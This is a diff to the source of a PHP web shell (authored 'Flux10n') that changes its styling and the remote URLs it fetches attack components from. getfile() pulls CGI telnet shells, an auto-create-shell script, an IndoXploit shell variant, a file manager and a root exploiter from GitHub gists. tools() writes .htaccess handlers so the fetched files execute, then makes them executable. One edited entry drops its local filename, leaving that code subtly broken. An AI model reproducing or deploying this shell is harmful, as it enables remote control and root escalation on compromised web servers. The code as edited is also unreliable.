@@ -1,20 +1,21 @@
 <!DOCTYPE HTML>
 <html>
 <head>
-<title>403 Mas</title>
+<title>危険な </title>
 <meta name='author' content='Flux10n'>
 <meta charset="UTF-8">
 <link rel="icon" href="https://telegra.ph/file/4655dfa5720da906ead7e.jpg" type="image/x-icon">
 <meta name="robots" content="noindex">
 <meta name="googlebot" content="noindex">
-<meta name="theme-color" content="#00ff00">
+<meta name="theme-color" content="#333">
 <style type='text/css'>
 @import url(https://fonts.googleapis.com/css?family=Abel);
 @import url(http://fonts.googleapis.com/css?family=Iceberg);
 html {background: #111111;color: #ffffff;font-family: 'Iceberg';font-size: 13px;width: 100%;}
-.asw{color: lime;}
+li {display: inline;margin: 5px;padding: 5px;}
+.haha{color: lime;}
 b {color: gold;}
-#ayonima:hover{ background-color: #1a1a1a; }
+#hengker:hover{ background-color: #1a1a1a; }
 th {padding: 10px;}
 .table_home tr:hover {background-color: green;}
 .th_home tr:hover{background-color: #1a1a1a;} 
@@ -26,7 +27,7 @@ select {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin:
 .but {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Abel';font-size: 13px;}
 li a:hover{text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color:#00ff00;text-decoration: none;}
 ul {margin:0; padding:0;}
-.th_home{text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color: #00ff00;text-decoration: none;}
+.th_home, .titulo {text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color: #00ff00;text-decoration: none;}
 .board {text-align: center;border: 1px solid rgba(255,180,0,0.4);border-radius: 4px;width: 500px;}
 .board p {font-size: 65px;font-family: 'Monoton', cursive;color: #fff;text-transform: uppercase;padding: 0;margin: 0;}
 </style>
@@ -240,8 +241,8 @@ function getfile($name) {
 	elseif($name === "cgitelnet1") $get = array("https://gist.githubusercontent.com/flux10n/51058b13e73cbbe21bdaa4b67106ef78/raw/5948db8b8e3d6d898bf6d848d336e3e021ca2ea3/cgi1.txt", "idx_cgi/cgitelnet1.idx");
 	elseif($name === "cgitelnet2") $get = array("https://gist.githubusercontent.com/flux10n/292e6932a078aa2aab8a34a5389e11df/raw/7e373028ef11b239d2185dee0e0ec530db6d19ba/cgi2.txt", "idx_cgi/cgitelnet2.idx");
 	elseif($name === "cgipy") $get = array("https://gist.githubusercontent.com/flux10n/8b54370c014e58140d0e3cd9d1af8fe7/raw/a0443d2aa2341a72e28fc5b17f30176a837b9ac6/cgipy.txt", "idx_cgi/cgipy.idx");
-	elseif($name === "acs") $get = array("https://raw.githubusercontent.com/flux10n/auto-create-shell/main/system.py", "zamn/acs.py");
-    elseif($name === "func") $get = array("https://raw.githubusercontent.com/flux10n/IndoXploit-Shell/main/gws.php", "zing/func.php");
+	elseif($name === "acs") $get = array("https://gist.githubusercontent.com/flux10n/488c4ffc0b302856bfc8f481a005408d/raw/6c69674083a7afac7e8619aa07bb20071ea7bc4a/auto-create-shell.py");
+    elseif($name === "func") $get = array("https://gist.githubusercontent.com/flux10n/342120ad7e45b6fdb73583cb1d5c7a23/raw/01b9c27cd3d907916b91132d5d801f2910e8d313/toss.php", "zing/func.php");
 	elseif($name === "fm") $get = array("https://gist.githubusercontent.com/flux10n/394945df8e1c8f9836318d2c0ca11ab6/raw/c769acbf996c5dfcb6f71420634c70d66af694af/manager.php", "fm.php");
 	elseif($name === "LRE") $get = array("https://raw.githubusercontent.com/mukarramkhalid/root-exploiter-php-cpp/master/root-c.php", "makman.php");
 
@@ -739,7 +740,7 @@ function tools($toolsname, $args = null) {
 				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'zamn'."));
 				if(!is_dir(path()."/zamn/")) {
 					@mkdir('zamn', 0755);
-					save("zamn/.htaccess", "w", "AddHandler cgi-script .idx");
+					save("zamn/.htaccess", "w", "Options -Indexes");
 				}
 				if(getfile("acs")) {
 					chmod('zamn/acs.py', 0755);
@@ -765,7 +766,7 @@ function tools($toolsname, $args = null) {
                 if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'zing'."));
                 if(!is_dir(path()."/zing/")) {
                     @mkdir('zing', 0755);
-                    save("zing/.htaccess", "w", "AddHandler application/x-httpd-php55 .php");
+                    save("zing/.htaccess", "w", "AddHandler application/x-httpd-php55 .php"); 
                 }
                 if(getfile("func")) {
                     chmod('zing/func.php', 0755);
